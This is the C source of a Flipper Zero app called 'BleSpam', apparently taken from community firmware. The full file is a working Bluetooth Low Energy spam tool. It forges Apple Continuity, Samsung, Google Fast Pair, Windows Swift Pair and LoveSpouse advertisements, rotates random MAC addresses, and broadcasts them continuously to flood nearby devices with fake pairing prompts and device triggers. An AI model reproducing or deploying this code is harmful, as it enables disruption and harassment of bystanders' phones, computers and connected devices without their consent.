#include <furi.h>
#include <furi_hal.h>
#include <furi_hal_bt.h>
#include <furi_hal_random.h>
#include <gui/gui.h>
#include <gui/view.h>
#include <gui/view_dispatcher.h>
#include <gui/elements.h>
#include <stdlib.h>
#include <string.h>

#include "esp_boost.h"

#define TAG "BleSpam"

// --- Device types ---
typedef enum {
    TypeApplePP,    // Continuity ProximityPair
    TypeAppleNA,    // Continuity NearbyAction
    TypeSamsungBuds,
    TypeSamsungWatch,
    TypeFastPair,
    TypeSwiftPair,
    TypeLovePlay,
    TypeLoveStop,
    TypeRotate,
} DevType;

typedef struct {
    const char* name;
    DevType type;
    union {
        uint16_t pp_model;      // Apple PP: 2-byte model
        uint8_t na_action;      // Apple NA: action byte
        uint32_t buds_model;    // Samsung Buds: 3-byte model
        uint8_t watch_model;    // Samsung Watch: 1-byte model
    };
} DevEntry;

// Apple Proximity Pair models (from Xtreme/Momentum source)
// Apple Nearby Action types (from furiousMAC/continuity)
// Samsung EasySetup models (from Spooks4576)

static const DevEntry devs[] = {
    // Apple Proximity Pair
    {"AirPods",             TypeApplePP, .pp_model = 0x0220},
    {"AirPods 2",           TypeApplePP, .pp_model = 0x0F20},
    {"AirPods 3",           TypeApplePP, .pp_model = 0x1320},
    {"AirPods Pro",         TypeApplePP, .pp_model = 0x0E20},
    {"AirPods Pro 2",       TypeApplePP, .pp_model = 0x1420},
    {"AirPods Max",         TypeApplePP, .pp_model = 0x0A20},
    {"Beats Flex",          TypeApplePP, .pp_model = 0x1020},
    {"Beats Studio Buds",   TypeApplePP, .pp_model = 0x1120},
    {"Beats Studio Buds+",  TypeApplePP, .pp_model = 0x1620},
    {"Beats Solo 3",        TypeApplePP, .pp_model = 0x0620},
    {"Beats Studio 3",      TypeApplePP, .pp_model = 0x0920},
    {"Beats Fit Pro",       TypeApplePP, .pp_model = 0x1220},
    {"Beats X",             TypeApplePP, .pp_model = 0x0520},
    {"Powerbeats 3",        TypeApplePP, .pp_model = 0x0320},
    {"Powerbeats Pro",      TypeApplePP, .pp_model = 0x0B20},
    {"AirTag",              TypeApplePP, .pp_model = 0x0055},
    {"Hermes AirTag",       TypeApplePP, .pp_model = 0x0030},
    {"Apple Vision Pro",    TypeApplePP, .pp_model = 0x2420},

    // Apple Nearby Action
    {"Setup AppleTV",       TypeAppleNA, .na_action = 0x01},
    {"Transfer Number",     TypeAppleNA, .na_action = 0x02},
    {"Apple Watch",         TypeAppleNA, .na_action = 0x05},
    {"Pair AppleTV",        TypeAppleNA, .na_action = 0x06},
    {"Setup iPhone",        TypeAppleNA, .na_action = 0x09},
    {"HomePod Setup",       TypeAppleNA, .na_action = 0x0B},
    {"HomeKit AppleTV",     TypeAppleNA, .na_action = 0x0D},
    {"AppleTV AutoFill",    TypeAppleNA, .na_action = 0x13},
    {"AppleTV AudioSync",   TypeAppleNA, .na_action = 0x19},
    {"AppleTV ColorBal",    TypeAppleNA, .na_action = 0x1E},
    {"Join AppleTV?",       TypeAppleNA, .na_action = 0x20},
    {"Apple Vision Pro",    TypeAppleNA, .na_action = 0x24},
    {"AppleTV Connect..",   TypeAppleNA, .na_action = 0x27},
    {"AppleID AppleTV?",    TypeAppleNA, .na_action = 0x2B},
    {"Sign In Device",      TypeAppleNA, .na_action = 0x2F},

    // Samsung Buds (3-byte model)
    {"Samsung Buds Pro",    TypeSamsungBuds, .buds_model = 0xEE7A0C},
    {"Samsung Buds 2",      TypeSamsungBuds, .buds_model = 0xEAAA17},
    {"Samsung Buds Live",   TypeSamsungBuds, .buds_model = 0x850116},
    {"Samsung Buds FE",     TypeSamsungBuds, .buds_model = 0x3D8F41},
    {"Samsung Buds2 Purp",  TypeSamsungBuds, .buds_model = 0x39EA48},

    // Samsung Watch (1-byte model)
    {"Samsung Watch4 44",   TypeSamsungWatch, .watch_model = 0x04},
    {"Samsung Watch5 44",   TypeSamsungWatch, .watch_model = 0x11},
    {"Samsung Watch6 40",   TypeSamsungWatch, .watch_model = 0x1B},
    {"Samsung Watch Ultra", TypeSamsungWatch, .watch_model = 0x15},

    // Google Fast Pair
    {"Android Fast Pair",   TypeFastPair, {0}},

    // Windows Swift Pair
    {"Windows Swift Pair",  TypeSwiftPair, {0}},

    // LoveSpouse
    {"LoveSpouse Play",     TypeLovePlay, {0}},
    {"LoveSpouse Stop",     TypeLoveStop, {0}},

    // Rotate all
    {"[ALL] Rotate",        TypeRotate, {0}},
};

#define DEV_COUNT (sizeof(devs) / sizeof(devs[0]))

typedef struct {
    int sel;
    bool broadcasting;
    bool ble_ok;
    bool esp_connected;
} BleSpamModel;

typedef struct {
    ViewDispatcher* vd;
    View* view;
    FuriThread* worker;
    bool running;
    int sel;
    EspBoost* esp;
} BleSpamApp;

// --- Packet building (matches Xtreme/Momentum original) ---

static uint8_t build_apple_pp(uint8_t* pkt, uint16_t model) {
    uint8_t i = 0;
    uint8_t prefix;
    if(model == 0x0055 || model == 0x0030)
        prefix = 0x05; // AirTag
    else
        prefix = 0x01; // Not Your Device

    pkt[i++] = 25 + 5; // Size (continuity_size + header overhead - 1)
    pkt[i++] = 0xFF;    // AD Type: Manufacturer Specific
    pkt[i++] = 0x4C;    // Apple company ID
    pkt[i++] = 0x00;
    pkt[i++] = 0x07;    // Continuity Type: Proximity Pair
    pkt[i++] = 0x19;    // Continuity Size (25)

    pkt[i++] = prefix;
    pkt[i++] = (model >> 8) & 0xFF;  // Device Model high
    pkt[i++] = (model >> 0) & 0xFF;  // Device Model low
    pkt[i++] = 0x55;                  // Status
    pkt[i++] = ((rand() % 10) << 4) + (rand() % 10); // Buds battery
    pkt[i++] = ((rand() % 8) << 4) + (rand() % 10);  // Case battery + charging
    pkt[i++] = (rand() % 256);        // Lid open counter
    pkt[i++] = 0x00;                  // Device color
    pkt[i++] = 0x00;
    furi_hal_random_fill_buf(&pkt[i], 16); // Encrypted payload
    i += 16;

    return i; // 31
}

static uint8_t build_apple_na(uint8_t* pkt, uint8_t action) {
    uint8_t i = 0;
    uint8_t flags = 0xC0;
    if(action == 0x20 && rand() % 2) flags--; // Join AppleTV spam boost
    if(action == 0x09 && rand() % 2) flags = 0x40; // Glitched Setup New Device

    pkt[i++] = 5 + 5;   // Size
    pkt[i++] = 0xFF;     // AD Type: Manufacturer Specific
    pkt[i++] = 0x4C;     // Apple company ID
    pkt[i++] = 0x00;
    pkt[i++] = 0x0F;     // Continuity Type: Nearby Action
    pkt[i++] = 0x05;     // Continuity Size (5)

    pkt[i++] = flags;    // Action flags
    pkt[i++] = action;   // Action type
    furi_hal_random_fill_buf(&pkt[i], 3); // Auth tag
    i += 3;

    return i; // 11
}

static uint8_t build_samsung_buds(uint8_t* pkt, uint32_t model) {
    uint8_t i = 0;
    pkt[i++] = 27;      // Size
    pkt[i++] = 0xFF;     // AD Type: Manufacturer Specific
    pkt[i++] = 0x75;     // Samsung company ID
    pkt[i++] = 0x00;
    pkt[i++] = 0x42;
    pkt[i++] = 0x09;
    pkt[i++] = 0x81;
    pkt[i++] = 0x02;
    pkt[i++] = 0x14;
    pkt[i++] = 0x15;
    pkt[i++] = 0x03;
    pkt[i++] = 0x21;
    pkt[i++] = 0x01;
    pkt[i++] = 0x09;
    pkt[i++] = (model >> 16) & 0xFF; // Model byte 0
    pkt[i++] = (model >> 8) & 0xFF;  // Model byte 1
    pkt[i++] = 0x01;
    // Pad remaining to size 28
    while(i < 28) pkt[i++] = 0x00;
    return 28;
}

static uint8_t build_samsung_watch(uint8_t* pkt, uint8_t model) {
    uint8_t i = 0;
    pkt[i++] = 14;      // Size
    pkt[i++] = 0xFF;     // AD Type: Manufacturer Specific
    pkt[i++] = 0x75;     // Samsung company ID
    pkt[i++] = 0x00;
    pkt[i++] = 0x01;
    pkt[i++] = 0x00;
    pkt[i++] = 0x02;
    pkt[i++] = 0x00;
    pkt[i++] = 0x01;
    pkt[i++] = 0x01;
    pkt[i++] = 0xFF;
    pkt[i++] = 0x00;
    pkt[i++] = 0x00;
    pkt[i++] = 0x43;
    pkt[i++] = model;   // Watch model
    return i; // 15
}

static uint8_t build_fastpair(uint8_t* pkt) {
    // Two AD structures like the original
    uint32_t model = (rand() & 0xFFFFFF); // Random Fast Pair model
    uint8_t i = 0;

    // AD structure 1: Service UUID List
    pkt[i++] = 3;       // Size
    pkt[i++] = 0x03;    // AD Type: Complete List of 16-bit Service UUIDs
    pkt[i++] = 0x2C;    // Google FastPair UUID
    pkt[i++] = 0xFE;

    // AD structure 2: Service Data
    pkt[i++] = 6;       // Size
    pkt[i++] = 0x16;    // AD Type: Service Data
    pkt[i++] = 0x2C;    // Google FastPair UUID
    pkt[i++] = 0xFE;
    pkt[i++] = (model >> 16) & 0xFF;
    pkt[i++] = (model >> 8) & 0xFF;
    pkt[i++] = (model >> 0) & 0xFF;

    // AD structure 3: TX Power Level
    pkt[i++] = 2;
    pkt[i++] = 0x0A;    // AD Type: TX Power
    pkt[i++] = 0x00;    // 0 dBm

    return i; // 14
}

static uint8_t build_swiftpair(uint8_t* pkt) {
    const char* name = "Flipper Z";
    uint8_t name_len = strlen(name);
    uint8_t size = 7 + name_len;
    uint8_t i = 0;

    pkt[i++] = size - 1;
    pkt[i++] = 0xFF;     // AD Type: Manufacturer Specific
    pkt[i++] = 0x06;     // Microsoft company ID
    pkt[i++] = 0x00;
    pkt[i++] = 0x03;     // Microsoft Beacon ID
    pkt[i++] = 0x00;     // Beacon Sub Scenario
    pkt[i++] = 0x80;     // Reserved RSSI
    memcpy(&pkt[i], name, name_len);
    i += name_len;

    return i;
}

static uint8_t build_packet(uint8_t* pkt, const DevEntry* dev) {
    switch(dev->type) {
    case TypeApplePP:
        return build_apple_pp(pkt, dev->pp_model);
    case TypeAppleNA:
        return build_apple_na(pkt, dev->na_action);
    case TypeSamsungBuds:
        return build_samsung_buds(pkt, dev->buds_model);
    case TypeSamsungWatch:
        return build_samsung_watch(pkt, dev->watch_model);
    case TypeFastPair:
        return build_fastpair(pkt);
    case TypeSwiftPair:
        return build_swiftpair(pkt);
    case TypeLovePlay:
    case TypeLoveStop: {
        uint8_t i = 0;
        pkt[i++] = 0x08;
        pkt[i++] = 0xFF;
        pkt[i++] = 0x00;
        pkt[i++] = 0x00;
        pkt[i++] = 0x00;
        pkt[i++] = 0x00;
        pkt[i++] = 0x00;
        pkt[i++] = 0x00;
        pkt[i++] = 0x00;
        return i;
    }
    default:
        return 0;
    }
}

static EspBoostCmd dev_type_to_esp_cmd(DevType type) {
    switch(type) {
    case TypeApplePP:
    case TypeAppleNA:
        return EspBoostCmdApple;
    case TypeSamsungBuds:
    case TypeSamsungWatch:
        return EspBoostCmdSamsung;
    case TypeFastPair:
        return EspBoostCmdGoogle;
    case TypeSwiftPair:
        return EspBoostCmdWindows;
    default:
        return EspBoostCmdRandom;
    }
}

// --- BLE worker thread ---
static int32_t worker_fn(void* ctx) {
    BleSpamApp* app = ctx;

    GapExtraBeaconConfig config;
    memset(&config, 0, sizeof(config));
    config.adv_channel_map = GapAdvChannelMapAll;
    config.adv_power_level = GapAdvPowerLevel_6dBm;
    config.address_type = GapAddressTypeRandom;

    int rotate_idx = 0;

    while(app->running) {
        int idx = app->sel;
        if(devs[idx].type == TypeRotate) {
            idx = rotate_idx;
            rotate_idx = (rotate_idx + 1) % ((int)DEV_COUNT - 1);
        }

        const DevEntry* dev = &devs[idx];
        uint8_t pkt[31];
        uint8_t pkt_len = build_packet(pkt, dev);
        if(pkt_len == 0) {
            furi_delay_ms(100);
            continue;
        }

        // Random MAC
        furi_hal_random_fill_buf(config.address, 6);
        config.address[5] = (config.address[5] & 0x3F) | 0xC0;

        config.min_adv_interval_ms = 50;
        config.max_adv_interval_ms = 75;

        furi_hal_bt_extra_beacon_stop();
        bool ok = furi_hal_bt_extra_beacon_set_config(&config);
        if(ok) ok = furi_hal_bt_extra_beacon_set_data(pkt, pkt_len);
        if(ok) ok = furi_hal_bt_extra_beacon_start();

        with_view_model(
            app->view,
            BleSpamModel * m,
            { m->ble_ok = ok; },
            true);

        if(ok) {
            furi_hal_light_set(LightBlue, 0xFF);
        } else {
            furi_hal_light_set(LightRed, 0xFF);
        }

        furi_delay_ms(200);
        furi_hal_light_set(LightBlue, 0x00);
        furi_hal_light_set(LightRed, 0x00);
        furi_delay_ms(50);
    }

    furi_hal_bt_extra_beacon_stop();
    return 0;
}

// --- Start / Stop ---
static void do_start(BleSpamApp* app) {
    if(app->running) return;
    furi_hal_bt_stop_advertising();
    app->running = true;
    furi_thread_start(app->worker);

    if(app->esp) {
        EspBoostCmd cmd = dev_type_to_esp_cmd(devs[app->sel].type);
        esp_boost_start(app->esp, cmd);
    }

    with_view_model(
        app->view,
        BleSpamModel * m,
        { m->broadcasting = true; },
        true);
}

static void do_stop(BleSpamApp* app) {
    if(!app->running) return;
    app->running = false;
    furi_thread_join(app->worker);

    furi_hal_bt_extra_beacon_stop();
    furi_hal_bt_start_advertising();

    if(app->esp) {
        esp_boost_stop(app->esp);
    }

    furi_hal_light_set(LightBlue, 0x00);
    furi_hal_light_set(LightRed, 0x00);

    with_view_model(
        app->view,
        BleSpamModel * m,
        { m->broadcasting = false; },
        true);
}

// --- Draw callback ---
static void draw_cb(Canvas* canvas, void* model) {
    BleSpamModel* m = model;

    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);

    const char* title = m->esp_connected ? "BleSpam+ESP" : "BleSpam";
    canvas_draw_str_aligned(canvas, 64, 2, AlignCenter, AlignTop, title);

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str_aligned(canvas, 64, 16, AlignCenter, AlignTop, devs[m->sel].name);

    char buf[32];
    snprintf(buf, sizeof(buf), "%d / %d", m->sel + 1, (int)DEV_COUNT);
    canvas_draw_str_aligned(canvas, 64, 28, AlignCenter, AlignTop, buf);

    canvas_set_font(canvas, FontPrimary);
    if(m->broadcasting) {
        canvas_draw_str_aligned(canvas, 64, 40, AlignCenter, AlignTop, "Broadcasting");
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str_aligned(
            canvas, 64, 52, AlignCenter, AlignTop, m->ble_ok ? "BLE:OK" : "BLE:ERR");
    } else {
        canvas_draw_str_aligned(canvas, 64, 40, AlignCenter, AlignTop, "Stopped");
    }

    elements_button_left(canvas, "< Prev");
    elements_button_right(canvas, "Next >");
    elements_button_center(canvas, m->broadcasting ? "STOP" : "START");
}

// --- Input callback ---
static bool input_cb(InputEvent* event, void* ctx) {
    BleSpamApp* app = ctx;
    if(event->type != InputTypeShort && event->type != InputTypeLong) return false;

    if(event->key == InputKeyOk) {
        if(app->running)
            do_stop(app);
        else
            do_start(app);
        return true;
    }

    if(event->key == InputKeyLeft) {
        bool was = app->running;
        if(was) do_stop(app);
        app->sel = (app->sel - 1 + (int)DEV_COUNT) % (int)DEV_COUNT;
        with_view_model(
            app->view, BleSpamModel * m, { m->sel = app->sel; }, true);
        if(was) do_start(app);
        return true;
    }

    if(event->key == InputKeyRight) {
        bool was = app->running;
        if(was) do_stop(app);
        app->sel = (app->sel + 1) % (int)DEV_COUNT;
        with_view_model(
            app->view, BleSpamModel * m, { m->sel = app->sel; }, true);
        if(was) do_start(app);
        return true;
    }

    if(event->key == InputKeyBack) {
        if(app->running) do_stop(app);
        view_dispatcher_stop(app->vd);
        return true;
    }

    return false;
}

// --- Main entry ---
int32_t x_ble_spam_main(void* p) {
    UNUSED(p);

    BleSpamApp* app = malloc(sizeof(BleSpamApp));
    memset(app, 0, sizeof(BleSpamApp));

    // ESP32 boost init (NULL = not connected or UART busy, app works fine without it)
    app->esp = esp_boost_init();

    app->vd = view_dispatcher_alloc();
    app->view = view_alloc();
    view_allocate_model(app->view, ViewModelTypeLocking, sizeof(BleSpamModel));
    view_set_draw_callback(app->view, draw_cb);
    view_set_input_callback(app->view, input_cb);
    view_set_context(app->view, app);

    with_view_model(
        app->view,
        BleSpamModel * m,
        {
            m->sel = 0;
            m->broadcasting = false;
            m->ble_ok = false;
            m->esp_connected = esp_boost_is_connected(app->esp);
        },
        true);

    view_dispatcher_add_view(app->vd, 0, app->view);

    Gui* gui = furi_record_open(RECORD_GUI);
    view_dispatcher_attach_to_gui(app->vd, gui, ViewDispatcherTypeFullscreen);
    view_dispatcher_switch_to_view(app->vd, 0);

    app->worker = furi_thread_alloc();
    furi_thread_set_name(app->worker, "BleSpam");
    furi_thread_set_stack_size(app->worker, 2048);
    furi_thread_set_callback(app->worker, worker_fn);
    furi_thread_set_context(app->worker, app);

    view_dispatcher_run(app->vd);

    if(app->running) do_stop(app);

    furi_thread_free(app->worker);
    view_dispatcher_remove_view(app->vd, 0);
    view_free(app->view);
    view_dispatcher_free(app->vd);
    furi_record_close(RECORD_GUI);

    esp_boost_free(app->esp);
    free(app);

    return 0;
}
